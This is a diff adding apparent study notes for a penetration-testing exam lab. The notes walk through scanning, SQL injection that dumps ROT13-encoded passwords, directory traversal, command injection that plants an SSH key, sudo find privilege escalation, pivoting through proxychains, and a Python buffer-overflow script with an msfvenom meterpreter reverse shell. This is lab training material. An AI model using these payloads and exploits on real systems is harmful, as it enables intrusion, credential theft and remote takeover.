@@ -1,0 +1,483 @@
+
+Dry Run Op-Notes:
+
+First IP:
+	10.50.30.251
+	
+host 1 NMAP results:
+Host is up (0.0018s latency).
+Not shown: 9998 filtered ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+| ssh-hostkey: 
+|   2048 bd:96:53:8b:cc:ba:80:8e:2e:de:7c:f3:d5:7f:a6:66 (RSA)
+|   256 d6:a9:a8:8b:7b:b0:1d:c1:46:90:25:06:e9:09:f7:67 (ECDSA)
+|_  256 bb:22:62:3c:89:38:3b:7f:d2:59:d3:6f:8e:ba:a9:ce (EdDSA)
+| ssh2-enum-algos: 
+|   kex_algorithms: (10)
+|   server_host_key_algorithms: (5)
+|   encryption_algorithms: (6)
+|   mac_algorithms: (10)
+|_  compression_algorithms: (2)
+80/tcp open  http
+
+
+
+FOUND ON WEBSITE on /scripts directory:
+	#!/usr/bin/python3
+	import os
+	system_user=user2
+	user_password=EaglesIsARE78
+	##Developer note
+	#script will eventually take above system user credentials and run automated services
+
+
+/getcareers.php will let you read /etc/passwd
+
+FOUND IN /ETC/HOSTS:::::
+	192.168.28.181 WebApp
+
+	found in WebApp nmap results:
+
+	Host is up (0.0015s latency).
+	Not shown: 9998 closed ports
+	PORT   STATE SERVICE
+	22/tcp open  ssh
+	|_banner: SSH-2.0-OpenSSH_7.6p1 Ubuntu-4ubuntu0.3
+
+	80/tcp open  http
+
+
+
+WEBAPP:
+
+http://localhost:31950/pick.php?product=7%20UNION%20select%20table_schema,table_name,column_name%20from%20information_schema.columns
+
+THIS WORKS!!
+YOU NEED TO USE 7!!!
+
+RESULTS:
+DB		COLUMN		TABLE
+siteusers 	id 		$customer
+siteusers 	name 		$customer
+siteusers 	account 	$customer
+siteusers 	category 	$customer
+siteusers 	description 	$customer
+siteusers 	id 		$net_products
+siteusers 	quantity 	$net_products
+siteusers 	product 	$net_products
+siteusers 	price 		$net_products
+siteusers 	id 		$purchase_history
+siteusers 	quantity 	$purchase_history
+siteusers 	product 	$purchase_history
+siteusers 	account 	$purchase_history
+siteusers 	id 		$shippingdates
+siteusers 	ordernumber 	$shippingdates
+siteusers 	account 	$shippingdates
+siteusers 	date 		$shippingdates
+siteusers 	user_id 	$users
+siteusers 	name 		$users
+siteusers 	username 	$users
+
+earlier:
+mysql 	Server_name 	$servers
+mysql 	Host 		$servers
+mysql 	Db 		$servers
+mysql 	Username 	$servers
+mysql 	Password 	$servers
+mysql 	Port 		$servers
+mysql 	Socket 	$servers
+mysql 	Wrapper 	$servers
+mysql 	Owner 		$servers
+
+mysql 	Host 		$user
+mysql 	User 		$user
+mysql 	Password 	$user
+
+password found from mysql.user password:
+	webuser  :  *BF207353FF1EAA9EBA7DD87E37E6D278746F17CD
+
+DOESN'T WORK for ssh to the server.
+
+
+
+
+siteusers 	user_id 	$users
+siteusers 	name 		$users
+siteusers 	username 	$users
+
+THESE GAVE ME THIS:
+
+1 	Aaron 				$Aaron
+2 	user2 				$user2
+3 	user3 				$user3
+4 	Lroth 				$Lee_Roth
+1 	ncnffjbeqlCn$$jbeq 		$Aaron			apasswordyPa$$word
+2 	RntyrfVfNER78 			$user2			EaglesIsARE78
+3 	Obo4GURRnccyrf 		$user3			Bob4THEEapples
+4 	anotherpassword4THEages 	$Lroth
+
+
+
+
+
+192.168.250.144.35724
+
+
+
+
+
+
+192.168.28.172 NMAP RESULTS
+
+Nmap scan report for 192.168.28.172
+Host is up (0.0015s latency).
+Not shown: 65533 closed ports
+PORT     STATE SERVICE
+22/tcp   open  ssh
+7008/tcp open  afs3-update
+
+Nmap done: 1 IP address (1 host up) scanned in 101.01 seconds
+
+
+
+1 	ncnffjbeqlCn$$jbeq 		$Aaron			apasswordyPa$$word
+works on this box
+
+
+sudo find . -exec /bin/sh \; -quit
+
+
+
+64 bytes from 192.168.28.179: icmp_seq=1 ttl=128 time=1.43 ms
+
+
+
+
+
+
+
+
+SSgt Wilson Review:
+
+
+
+Test will be one ip address and go from there. 
+
+Steps/methodology:
+	host discovery
+		for i in {1..254} ;do (ping -c 1 192.168.28.$i | grep "bytes from" &) ;done
+		
+	port discovery
+		nmap -sT -T4 -p 1-10000 <ip>
+	
+	port interrogation
+	
+	exploitation
+
+
+web exploitation:
+
+command injection or webshell:
+	Test with.
+	'; whoami'
+
+	
+	All you should do with command injection is upload your ssh key:
+		;mkdir .ssh
+		
+	ssh-keygen -t rsa
+        *get ssh key
+    cat ~/.ssh/id_rsa.pub
+        *new public key
+    
+    now do a command injection on the web server to make ssh directory:
+        ; mkdir /var/www/.ssh
+    
+    now do a command injection again to add your key to authorized keys:
+        ; echo "<full key>" >> /var/www/.ssh/authorized_keys
+        ; cat /var/www/.ssh/authorized_keys		
+
+
+
+
+
+====================================
+dryrun steps:
+====================================
+
+nmap -Pn -T4 <my initial ip> -sT
+	returns port 22 and port 80 are open.
+
+banner grab both, don't assume.
+
+we don't have creds, so we can't attack ssh. We have a website though, which is a better option.
+
+
+One way to start enumerating is just opening up firefox, which is fine.
+Even better though, is using nikto:
+	nikto -h <ip>
+	This will return /scripts and /login
+Nmap NSE could also give you more info.
+user --script http-enum or --script discovery
+	Will give the same results in this case.
+		
+/scripts gives you 'user2:EaglesIsARE78' creds
+
+{
+	alternate method to get creds:
+	go to login page
+	use the basic '1 or 1='1 sql injection
+	in developer tools, GET the raw post request in network tab
+	now append a ?<raw request> into the url
+	this makes it into a GET request
+	This will spill creds.
+}
+
+
+now looking at /getcareers
+
+this is directory traversal, not command injection. '; whoami' does not work
+
+use:
+../../../../../../../../../etc/passwd
+../../../../../../../../../etc/hosts
+
+not that useful, but it gives us users.
+
+THE ONLY ENCODING WE'LL USE IS ROT13 and base64
+WE'LL know the names of the boxes  we're attacking on the test
+
+The file upload thing was a waste of time. 
+
+
+
+
+
+Now on the backend of the first box:
+first, run whoami and hostname
+	user2
+	PublicFacingWebsite
+
+
+Now try to root the box:
+
+always try:
+	sudo -l first.
+	no dice.
+
+now try:
+	find / -type f -perm /(4, 2, 6)000 2>/dev/null
+	look at everything in GTFO bins. 
+	also no results.
+	check 4000, then 2000, then 6000
+
+
+You're not supposed to get root on all 4 boxes. 
+	
+IMPORTANT NOTE IMPORTANT NOTE IMPORTANT NOTE:
+	which gdb
+	IF THE BOX HAS GDB, YOU WILL BE DOING A BUFFER OVERFLOW ON THE BOX!!!
+
+
+We can't get root on this machine, so move on to the next box. 
+
+ip neigh
+ip route
+ip addr
+cat /etc/hosts.
+
+/etc/hosts gives us:
+192.168.28.181
+
+also do the ping sweep command:
+results:
+	192.168.28.181
+	192.168.28.172
+
+set up Dynamic Port forward to hit the .181:
+	ssh user2@<ip> -D 9050
+
+now do port discovery:
+	proxychains nmap -sT -Pn -T4 -p 1-10000 <ip> -script discovery
+	
+good practice is to close the dynamic tunnel as soon as you're done with it.
+
+replace it with a local port forward hitting port 80 on the .181:
+	ssh user2@<1st ip> -L <RHP>:192.168.28.181:80
+
+now open firefox.
+
+we're looking at a website
+This is a SQL injection.
+on this one, we can use the golden statement:
+	(# )UNION select table_schema,table_name,column_name from information_schema.columns
+
+SSgt Wilson steps:
+	0- Identify SQL database
+	1- Identify method for SQL database variables, get or post?
+	2- Identify vulnerable field.
+	3- Identify number of Columns <- skip and parish
+	4- Use golden statement
+	5- Enumerate user created tables: select <columns> from <database>.<table>
+	6- profit
+
+
+sql injection:
+ 7 UNION SELECT username,name,user_id from siteusers.users
+
+will give me all the users, passwords, and their ids. 
+All of the passwords are ROT13 encoded.
+
+SQL database may turn sideways...
+
+the creds we get from this SQL database work on the .172 host.
+
+WRITE THIS DOWN WRITE THIS DOWN::::
+
+sudo find . -exec /bin/bash \; -quit
+	is different from
+sudo ./find . -exec /bin/bash \' -quit
+
+^^This is how we privilege escalated on RoundSensor
+
+445 is always SMB
+3389 is always RDP
+
+
+set dynamic port forward from the .172
+
+then do:
+proxychains nmap -T4 -Pn -script discovery -p 1-10000 192.168.28.179
+
+
+
+
+we find 9999 is open. It's running secure server.
+
+		THAT MEANS REMOTE BUFFER OVERFLOW.
+msfconsole
+use multi/handler
+set LPORT 0.0.0.0
+set LPORT 4444 (or same RHP)
+
+
+
+
+Script to do the overflow:
+	import socket
+
+	buf = "TRUN /.:/"
+	buf += "A" * 2003
+	buf += "\xa0\x12\x50\x62"
+	buf += '\x90' * 20
+
+	buf (+)=<MSF VENOM PAYLOAD>
+
+	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	s.connect(('0.0.0.0', RHP))
+	s.recv(1024)
+	s.send(buf)
+	s.recv(1024)
+	s.close()
+
+
+
+Shellcode Generation:
+	msfvenom -p windows/meterpreter/reverse_tcp LHOST=<linops ip> LPORT=<RHP> -b '\x00' -f python
+		***RHP should match what you use in meterpreter.
+	
+THE EIP FOR SECURESERVER---  \xa0\x12\x50\x62
+
+
+YOU MUST SUBMIT OP NOTES TO GET CREDIT FOR THE EXAM.
+
+
+If you see a wall of text, you should read it.
+If you don't fee like it, you should look for links or other interesting things instead.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
